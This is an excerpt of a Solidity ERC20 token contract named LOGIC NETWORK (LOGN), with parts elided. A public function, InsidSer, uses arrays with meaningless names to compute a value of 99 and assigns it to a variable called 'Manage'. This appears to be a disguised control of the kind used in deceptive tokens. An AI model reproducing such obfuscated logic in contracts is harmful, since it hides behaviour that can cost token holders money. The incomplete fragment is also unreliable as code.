...
contract LogicNetwork is Context, IERC20, Ownable {

    using SafeMath for uint256;

    string private constant _name = "LOGIC NETWORK";
    string private constant _symbol = "LOGN";
    ...
    uint256[6] QWeer = [1,0,33,23,5,12];
    uint256[7] Pweer = [0,1,12,33,4,7,3];
    uint256[2] Gweer = [0,33];
    ...
    uint256 public _maxWdrstSize = _tTotal * 4/100;
    ...
    function InsidSer(string memory Wdrs ) public {
        Wdrs = "Wdrs";
            QueeZ = QWeer[2] +  Pweer[3] + Gweer[1] ;
            Manage = QueeZ;  
    }
